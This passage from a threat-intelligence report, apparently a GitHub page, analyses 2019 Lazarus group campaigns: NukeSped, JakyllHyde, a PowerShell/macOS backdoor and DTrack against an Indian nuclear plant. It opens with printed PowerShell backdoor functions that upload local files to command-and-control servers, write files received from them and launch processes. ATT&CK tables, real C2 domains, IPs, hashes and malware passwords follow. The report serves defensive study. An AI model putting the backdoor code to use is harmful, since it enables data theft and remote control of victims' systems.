		if($fs -eq $null){$trigger=updatemod2;}
		else
		{
			try
			{
				$fl=[int]$fs.length
				$nmsg=5
				$nrsv=0
				$nmlen=4
				$basefunctions=New-Object byte[] 16
				CopyBytes $nmsg $basefunctions 0
				CopyBytes $nrsv $basefunctions 4
				CopyBytes $nmlen $basefunctions 8
				CopyBytes $fl $basefunctions 12
				$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
				if($rq -eq $null){break}
				$basefunctions=DecryptC2Data $rq $global:mbz
				if(($basefunctions -eq $null) -or ($basefunctions.length -lt 24)){break}
				$nmsg=ConverttoInt32 $basefunctions 0
				$nmlen=ConverttoInt32 $basefunctions 8
				$rfl=ConverttoInt32 $basefunctions 12
				if($basefunctions.length -ne ($nmlen+12)){break}
				if(($nmlen -ne 12) -or ($nmsg -ne 5)){break}
				$trigger=updatemod1
				if($trigger -eq 0){break}
				$bed=0
				while($true)
				{
					$rq=PushDatatoC2 $global:tid 22 $null 0 $global:url[$global:nup]
					if($rq -eq $null){$trigger=0;break}
					$basefunctions=DecryptC2Data $rq $global:mbz
					if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){$trigger=0;break}
					$nmsg=ConverttoInt32 $basefunctions 0
					$nmlen=ConverttoInt32 $basefunctions 8
					if($basefunctions.length -ne ($nmlen+12)){$trigger=0;break}
					$fs.Write($basefunctions,12,$nmlen)
					if($nmsg -eq 17){$bed=1}
					$trigger=updatemod1
					if($trigger -eq 0){break}
					if($bed -eq 1){break}
				}
				$fs.Close()
				if($trigger -eq 0){break}
			}
			catch{$fs.Close();break}
		}
		$trigger=1
	} while($false)
	return $trigger
}
function download($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		$path=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
		$fs=$null
		try{$fs=[System.IO.File]::OpenRead($path)}catch{$fs=$null}
		if($fs -eq $null){$trigger=updatemod2;}
	else
	{
		try
		{
			$fl=$fs.length
			$basefunctions=New-Object byte[] 24
			CopyBytes 5 $basefunctions 0
			CopyBytes 0 $basefunctions 4
			CopyBytes 12 $basefunctions 8
			CopyBytes $fl $basefunctions 12
			CopyBytes 0 $basefunctions 16
			CopyBytes 0 $basefunctions 20
			$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
			if($rq -eq $null){break}
			$basefunctions=DecryptC2Data $rq $global:mbz
			if(($basefunctions -eq $null) -or ($basefunctions.length -lt 16)){break}
			$nmsg=ConverttoInt32 $basefunctions 0
			$nmlen=ConverttoInt32 $basefunctions 8
			$rfl=ConverttoInt32 $basefunctions 12
			if($basefunctions.length -ne ($nmlen+12)){break}
			if(($nmlen -ne 4) -or ($nmsg -ne 5)){break}
			$trigger=1
			if($rfl -gt $fl){$rfl=$fl}
			$fs.Seek($rfl, [System.IO.SeekOrigin]::Begin)
			while($true)
			{
				$ncrs=1024*100
				$tbf=New-Object byte[] $ncrs
				$nr=$fs.Read($tbf, 0, $tbf.Length)
				if($nr -eq 0){break}
				$nmsg=16
				$nrsv=0
				$nmlen=$nr
				$basefunctions=New-Object byte[] (12+$nr)
				CopyBytes $nmsg $basefunctions 0
				CopyBytes $nrsv $basefunctions 4
				CopyBytes $nmlen $basefunctions 8
				for($i=0;$i -lt $nr;$i++){$basefunctions[12+$i]=$tbf[$i]}
				$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
				if($rq -eq $null){$trigger=0;break}
				$basefunctions=DecryptC2Data $rq $global:mbz
				if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){$trigger=0;break}
				$nmsg=ConverttoInt32 $basefunctions 0
				$nmlen=ConverttoInt32 $basefunctions 8
				if($basefunctions.length -ne ($nmlen+12)){$trigger=0;break}
				if(($nmlen -ne 0) -or ($nmsg -ne 5)){$trigger=0;break}
			}
			$fs.close()
			if($trigger -eq 0){break}
			$trigger=updatemod3 17
			if($trigger -eq 0){break}
		}
		catch{$fs.Close();break}
	}
	$trigger=1
	} while($false)
	return $trigger
}
function kalv()
{
	$trigger=0
	do
	{
		$trigger=updatemod1
		if($trigger -eq 0){break}
		$trigger=1
	} while($false)
	return $trigger
}
function launch_process($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		$arg=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
		Start-Process $arg
		$trigger=updatemod1
		if($trigger -eq 0){break}
		$trigger=1
	} while($false)
	return $trigger
}
function PulsetoC2($rid)
{
	$trigger=$false
	if($rid -eq 16){$global:nup=($global:nup + 1) % $global:url.Length}
	$rq=senddata $global:tid $rid $null 0 $global:url[$global:nup]
	if($rq -ne $null)
	{
		$basefunctions=GetResponseC2 $rq $global:mbz
		if(($basefunctions.length -eq 2) -and ($basefunctions[0] -eq 49)){$trigger=$true}
	}
	return $trigger
}
```

<h6> As final, the both backdoor have the same functionalities and use the same common infrastructure for the both platforms targetted.</h6>
<h6>List of the domains contacted :h6>

|Domain|IP|ASN|Organization|Route|City|Coordinates|Country|
|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
|crabbedly.club|37.72.175.226|AS29802|SWIFTWAY-CLIENT-NEW-YORK|37.72.174.0/23|New York City|40.7143,-74.0060|United States|
|craypot.live|23.227.199.96|AS35017|Swiftway Communications, Inc|23.227.192.0/21 |Chicago|41.8500,-87.6500|United States|
|indagator.club|185.236.203.211|AS9009|M247 LTD Copenhagen Infrastructure|185.236.203.0/24|Ballerup|55.7317,12.3633|Denmark|

<h3>Nuclear's plant incident (DTrack)</h3><a name="Dtrack"></a>
<h6>On the stings, we can observe a function timestamp who return a date of the version, this is an of the sqllite version of the C libraries (3.21), this can be a reuse code of one of the stealers of the group for a new stealer.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/SQLite-Version-string.PNG">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/SQLite-Version.PNG">
</p>
<h6>The malware pivoting in the infrastructure and get an elevation in the privileges by the remote access to administrative shares (C$) with a like a default password "abcd@123".</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Mal-Actions-1.png">
</p>
<h6>The sensitive operations to do on the computer have an indicative CCS_, this can be a code identifier for this custom payload of DTrack. CCS can be the acronym Cabinet Committee on Security (CCS) of the Central Government of India.</h6>
<h6>Dtrack have the capacity to get the mac address and informations of network card adapter.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Mal-Get-Mac.png">
</p>
<h6>As stealer, Dtrack can get the data of the web browsers (Chrome and Firefox), this parsed the history, stored password and the URL. URl is interesting due to many company pushes in the deployment in the new computer in the domain, the intranet links, administrative links or links to console like SCADA, it's a good method for environmental recognition.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Mal-StealActions.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Mal-Get-History-1.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Mal-Get-History-2.png">
</p>

###### Once this done, Dtrack list the disks and the files on the disks and write it in a local tmp file with the password ```dkwero38oerA^t@#``` , this password is common at all the operations of the lazarus group.
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Mal-GetDisks.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Exp-Pass.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Exp-Data.PNG">
</p>
<h6>But the custom Dtrack malware don't perform logs and don't have a C2 URL to contact compared at the normal version, this is disabling for more stealth. Here, an example on the difference between normal and custom DTrack reference.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/log.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Ref.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Noref.png">
</p>
<h6>This can give a problem with Yara Rule due to the strings are the same just the execution are disabling. The fact that malware doesn't contact suggests that the other backdoor was already used to launch Dtrack and recover the data. It has been reported that North Korea's Kimsuky Group is attempting to develop a new design for the next generation of advanced heavy water reactors who burns thorium into the fuel core and they attacked many Indian nuclear physicists in this way.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/29-10-19/Art.PNG">
</p>
<h6>For concluding North Korea, try to get advanced technologies in multiples sectors aeronautics, space, energetic but also useful energetic independence in the current situation that could lead to an international blockade.</h6>
	<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>The process graphs resume cyber kill chains used by the attacker in the differents incidents :</h6>
<ul>
	<li> Powershell agents
<p align="left">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/cyber/cyber-power.PNG">
</p></li><li> HAL incident
<p align="left">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/cyber/cyber-HAL.PNG">
</p></li><li> Nuclear's plant incident
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/cyber/cyber-Nuclear.PNG">
</p></li>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>
<h6> List of all the references with MITRE ATT&CK Matrix</h6>
<h3>CES 2020</h3><a name="IOC-CES"></a>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Persistence|T1179 - Hooking|https://attack.mitre.org/wiki/Technique/T1179|
|Privilege Escalation|T1179 - Hooking<br/>T1055 - Process Injection|https://attack.mitre.org/wiki/Technique/T1179<br/>https://attack.mitre.org/wiki/Technique/T1055|
|Defense Evasion|T1112 - Modify Registry<br/>T1055 - Process Injection|https://attack.mitre.org/wiki/Technique/T1112<br/>https://attack.mitre.org/wiki/Technique/T1055|
|Credential Access|T1179 - Hooking|https://attack.mitre.org/wiki/Technique/T1179|
|Discovery|T1010 - Application Window Discovery<br/>T1082 - System Information Discovery<br/>T1124 - System Time Discovery|https://attack.mitre.org/wiki/Technique/T1010<br/>https://attack.mitre.org/wiki/Technique/T1082<br/>https://attack.mitre.org/wiki/Technique/T1124|
|Collection|T1115 - Clipboard Data|https://attack.mitre.org/wiki/Technique/T1115|

<h3> HAL</h3><a name="IOC-HAL"></a>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Rundll32|https://attack.mitre.org/techniques/T1085|
|Persistence|Registry Run Keys / Startup Folder|https://attack.mitre.org/techniques/T1060|
|Defense Evasion|Rundll32|https://attack.mitre.org/techniques/T1085|
|Discovery|Query Registry|https://attack.mitre.org/techniques/T1012|

<h3> Powershell backdoor </h3><a name="IOC-Power"></a>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Scripting<br>PowerShell|https://attack.mitre.org/techniques/T1064/<br>https://attack.mitre.org/techniques/T1086/|
|Defense Evasion|Scripting|https://attack.mitre.org/techniques/T1064/|
|Discovery|Account Discovery<br/>System Information Discovery<br/>System Time Discovery<br/>Query Registry|https://attack.mitre.org/techniques/T1087/<br/>https://attack.mitre.org/techniques/T1082/<br/>https://attack.mitre.org/techniques/T1124/<br/>https://attack.mitre.org/techniques/T1012/|
|Collection|Data from Local System|https://attack.mitre.org/techniques/T1005/|
|Command And Control|Data Encoding|https://attack.mitre.org/techniques/T1132/|
|Exfiltration|Data Encrypted|https://attack.mitre.org/techniques/T1022/|

<h3> MacOS backdoor </h3><a name="IOC-OSX"></a>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Scripting|https://attack.mitre.org/techniques/T1064/|
|Defense Evasion|Scripting|https://attack.mitre.org/techniques/T1064/|
|Discovery|Account Discovery<br/>System Information Discovery<br/>System Time Discovery|https://attack.mitre.org/techniques/T1087/<br/>https://attack.mitre.org/techniques/T1082/<br/>https://attack.mitre.org/techniques/T1124/|
|Collection|Data from Local System|https://attack.mitre.org/techniques/T1005/|
|Command And Control|Data Encoding|https://attack.mitre.org/techniques/T1132/|
|Exfiltration|Data Encrypted|https://attack.mitre.org/techniques/T1022/|

<h3>DTrack</h3><a name="IOC-DTrack"></a>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Command-Line Interface|https://attack.mitre.org/techniques/T1059/|
|Defense Evasion|Disabling Security Tools|https://attack.mitre.org/techniques/T1089/|
|Discovery|System Network Configuration Discovery<br>System Network Connections Discovery<br>Process Discovery|https://attack.mitre.org/techniques/T1016/<br>https://attack.mitre.org/techniques/T1049/<br>https://attack.mitre.org/techniques/T1057/|

<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> List of all the Indicators Of Compromise (IOC)</h6>
<h3> CES 2020 incident (NukeSped)</h3>

|Indicator|Description|
| ------------- |:-------------:|
|Lazarus.hwp|D4F055D170FD783AE4F010DF64CFD18D8FA9A971378298EB6E863C60F57B93E3|
|public.avi|CCAFBCFF1596E3DFD28DCB97A5BA85E6845E69464742EDFE136FE09BBEC86BA1|
|juliesoskin.com|Domain C2|
|necaled.com|Domain C2|
|valentinsblog.de|Domain C2|
|64.151.229.52|IP C2|
|185.136.207.217|IP C2|
|83.169.17.240|IP C2|

<h6> This can be exported as JSON format <a href="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Json/CES2020.json">Export in JSON</a></h6>
<h3> HAL incident (JakyllHyde)</h3>

|Indicator|Description|
| ------------- |:-------------:|
|JD-HAL-Manager.doc|1A172D92638E6FDB2858DCCA7A78D4B03C424B7F14BE75C2FD479F59049BC5F9|
|thumnail.db|26A2FA7B45A455C311FD57875D8231C853EA4399BE7B9344F2136030B2EDC4AA|
|curiofirenze.com|Domain C2|
|193.70.64.163|IP C2|	

<h6> This can be exported as JSON format <a href="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Json/HAL.json">Export in JSON</a></h6>
<h3> OSX Malwares (OSX.Yort) / Powershell backdoor</h3>

|Indicator|Description|
| ------------- |:-------------:|
|샘플_기술사업계획서(벤처기업평가용).doc|761BCFF9401BED2ACE80B85C43B230294F41FC4D1C0DD1FF454650B624CF239D|
|mt.dat|F9FFB15A6BF559773B0DF7D8A89D9440819AB285F17A7B0A98626C14164D170F|
|snphhuatvsbkw.ps1|4503A194E5064595E36EF01ED87C24203ACCE56F308AF23E2563E71F890B0188|
|연인심리테스트.xls|A7FF0DFC2456BAA80E6291619E0CA480CC8F071F42845EB8316483E077947339|
|sopiiubuvsclwukz.ps1|360431100AA6DA78B577CC8B4606FA66E6191056FAC7C42929ABEC5A4402DA7A|
|Flash Player|735365EF9AA6CCA946CFEF9A4B85F68E7F9F03011DA0CF5F5AB517A381E40D02|
|hxxps://crabbedly[.]club/board[.]php|HTTP/HTTPS requests|
|hxxps://craypot[.]live/board[.]php|HTTP/HTTPS requests|
|hxxps://indagator[.]club/board[.]php|HTTP/HTTPS requests|
|crabbedly[.]club|Domain C2|
|craypot[.]live|Domain C2|
|indagator[.]club|Domain C2|
|37.72.175.226|IP C2|
|23.227.199.96|IP C2|
|185.236.203.211|IP C2|
|hxxps://towingoperations[.]com/chat/chat[.]php|HTTP/HTTPS requests|
|hxxps://baseballcharlemagnelegardeur[.]com/wp-content/languages/common[.]php|HTTP/HTTPS requests|
|hxxps://www[.]tangowithcolette[.]com/pages/common[.]php|HTTP/HTTPS requests|

<h6> This can be exported as JSON format <a href="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Json/OSX-Powershell.json">Export in JSON</a></h6>
<h3> Nuclear's plant incident (DTrack)</h3>

|Indicator|Comments|
| ------------- |:-------------:|
|bfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbaebc070364.exe|BFB39F486372A509F307CDE3361795A2F9F759CBEB4CAC07562DCBAEBC070364|
|sct.exe|3cc9d9a12f3b884582e5c4daf7d83c4a510172a836de90b87439388e3cde3682|
|$R0C7TZX.DMP|93a01fbbdd63943c151679d037d32b1d82a55d66c6cb93c40ff63f2b770e5ca9|
|process.0xffffe800239e8080.0x3d0000.dmp|a0664ac662802905329ec6ab3b3ae843f191e6555b707f305f8f5a0599ca3f68|
|dtrack.exe|bfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbaebc070364|
|process.0xffffe800239e8080.0x890000.dmp|c5c1ca4382f397481174914b1931e851a9c61f029e6b3eb8a65c9e92ddf7aa4c|

<h6> This can be exported as JSON format <a href="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Json/DTrack.json">Export in JSON</a></h6>
<h3>DTrack</h3>

|Indicator|Comments|
| ------------- |:-------------:|
|8765888a825223f427756dce79956720.virobj|ee9cd8decf752a47eefe24369a806976dce8ac2c29a8271c68bc407326fb19a9
|dtrack|dfa984f8d6bfc4ae3920954ec8b768e3d5a9cc4349966a9d16f8bef658f83fcd|
|d.exe|4701cc722f03253fb332747f951fff4c4ff023e13096a7e090a22b95c70efbf3|
|mal|1ba8cba6337da612d1db2cdfe1b44f6110741d91ba696a5b125ebd3e9b081ed7|
|out|d0b970e8052a4e3a353e99f8f2f4f6436298e473466ca407c353715ec10c3087|
|process.0xffffe800239e8080.0x890000.dmp|c5c1ca4382f397481174914b1931e851a9c61f029e6b3eb8a65c9e92ddf7aa4c|
|flicker_free|4f71c62df0163d301cbc96e70771ebec2d4410679240c1d94183f5e10879c2f1|
|process.0xffffe800239e8080.0x3d0000.dm|a0664ac662802905329ec6ab3b3ae843f191e6555b707f305f8f5a0599ca3f68|
|sct.jpg|51ac3966b48c91947de4ce51a90aee9deb730d86cedf8c863d9dcdf0fb322537|
|sct.exe|3cc9d9a12f3b884582e5c4daf7d83c4a510172a836de90b87439388e3cde3682|
|dtrack.exe.bin|bfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbaebc070364|

<h6> This can be exported as JSON format <a href="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Json/Others_Dtrack.json">Export in JSON</a></h6>
<h2>Yara Rules<a name="Yara"></a></h2>
<h6> A list of YARA Rule is available <a href="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/YARA_Rule_Lazarus_October_2019.yar">here</a></h6>
<h2>Knowledge Graph<a name="Knowledge"></a></h2><a name="Know"></a>
<h6>The following diagram shows the relationships of the techniques used by the groups and their corresponding malware:</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/CTI.png">
</p>
<h2>Links <a name="Links"></a></h2>
<h6> Originals tweets: </h6><a name="tweet"></a>

* [https://twitter.com/RedDrip7/status/1186562944311517184](https://twitter.com/RedDrip7/status/1186562944311517184) <a name="Original-Tweet"></a>
* [https://twitter.com/Rmy_Reserve/status/1188235835956551680](https://twitter.com/Rmy_Reserve/status/1188235835956551680) 
* [https://twitter.com/a_tweeter_user/status/1188811977851887616](https://twitter.com/a_tweeter_user/status/1188811977851887616) 
* [https://twitter.com/spider_girl22/status/1187288313285079040](https://twitter.com/spider_girl22/status/1187288313285079040) 
* [https://twitter.com/objective_see/status/1187094701729443840](https://twitter.com/objective_see/status/1187094701729443840)
* [https://twitter.com/TweeterCyber/status/1191391454981177344](https://twitter.com/TweeterCyber/status/1191391454981177344)

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [6850189bbf5191a76761ab20f7c630ef.xls](https://app.any.run/tasks/27ea35e6-6211-468d-9b8a-8c4cf22764ce)
* [JD-HAL-Manager.doc](https://app.any.run/tasks/42c972b1-ec38-4637-9354-9de930ff50b2)
* [public.dll](https://app.any.run/tasks/9eb78213-df55-44c3-9465-e58eb0869e58)
* [CES2020 참관단.hwp](https://app.any.run/tasks/31be34b3-4d72-4831-8b76-6dfebe729b84)
* [B578CCF307D55D3267F98349E20ECFF1.dll](https://app.any.run/tasks/a766e70e-b07f-4a59-80fb-b18597d85b08)
* [a0664ac662802905329ec6ab3b3ae843f191e6555b707f305f8f5a0599ca3f68.exe](https://app.any.run/tasks/6396ddf7-4000-4ffb-92ea-bc33612ec8c0)
* [dtrack.exe](https://app.any.run/tasks/239f222b-4916-4bda-b185-91885d5f9a54)

<h6> External analysis: <a name="Analysis"></a></h6>

* [Analysis of Powershell malware of Lazarus group](https://blog.alyac.co.kr/2388)
* [Cryptocurrency businesses still being targeted by Lazarus](https://securelist.com/cryptocurrency-businesses-still-being-targeted-by-lazarus/90019/)

<h6> Ressources : </h6><a name="Ressources"></a>

* [List of South Korea exhibitors in CES2020](https://www.ces.tech/Show-Floor/Exhibitor-Directory.aspx?searchTerm=&sortBy=country&filter=South%20Korea)
* [North Korea's Kimsuky Group informations](https://twitter.com/issuemakerslab/status/1123291956333834244)
* [North Korean hackers sent hacking emails to Atomic Energy Commission of India(AECI) and the Secretary to the Government of India and the Director of the Bhabha Atomic Research Centre(BARC)](https://twitter.com/issuemakerslab/status/1190539805454520320)
* [Some of the malware made by North Korea to attack India were based on the example source code of the South Korean book](https://twitter.com/issuemakerslab/status/1190818549633187840)
* [github macro_pack ](https://github.com/sevagas/macro_pack)
* [North Korean hackers attack India Nuclear power plant followed by space research institute](http://www.newsis.com/view/?id=NISX20191107_0000823158&cID=10101&pID=10100)
* [Rewterz Threat Alert – Lazarus APT Group Drops Malicious PowerShell Scripts – IoCs](http://www.rewterz.com/rewterz-news/rewterz-threat-alert-lazarus-apt-group-drops-malicious-powershell-scripts-iocs)
